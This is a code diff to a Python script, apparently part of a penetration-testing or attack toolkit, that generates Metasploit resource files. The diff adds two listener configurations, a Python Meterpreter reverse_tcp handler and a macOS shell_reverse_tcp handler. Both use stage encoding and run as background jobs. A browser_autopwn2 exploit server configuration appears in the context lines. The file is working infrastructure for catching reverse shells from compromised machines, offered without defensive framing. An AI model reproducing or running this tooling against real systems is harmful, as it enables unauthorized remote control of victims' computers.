@@ -130,6 +130,7 @@ def build(lhost,lport):
     f.close()
 
 #====================================================
+#====================================================
   listenerFileName="{0}/{1}".format(listenerPath,"965-browserautopwn2.rc")
   options = "use auxiliary/server/browser_autopwn2\n"
   options += "set set SRVHOST {0}\nset SRVPORT 8080\n".format(lhost)
@@ -150,6 +151,49 @@ def build(lhost,lport):
     f.write(options)
     f.close()
 
+
+#====================================================
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"970-pythonreverse_tcp.rc")
+  options = "use multi/handler\n"
+  options += "set payload python/meterpreter/reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding true\n"
+  options += "exploit -j\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+#====================================================
+
+#====================================================
+  listenerFileName="{0}/{1}".format(listenerPath,"975-MacShellReverseTCP.rc")
+  options = "use multi/handler\n"
+  options += "set payload osx/x64/shell_reverse_tcp\n"
+  options += "set LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+  options += "set ExitOnSession false\n"
+  options += "set EnableStageEncoding true\n"
+  options += "exploit -j\n"
+  if not os.path.exists(os.path.dirname(listenerFileName)):
+    try:
+        os.makedirs(os.path.dirname(listenerFileName))
+    except OSError as exc:
+        if exc.errno != errno.EEXIST:
+            raise
+  with open(listenerFileName, "w") as f:
+    f.write(options)
+    f.close()
+
+
+#====================================================
 
 
 
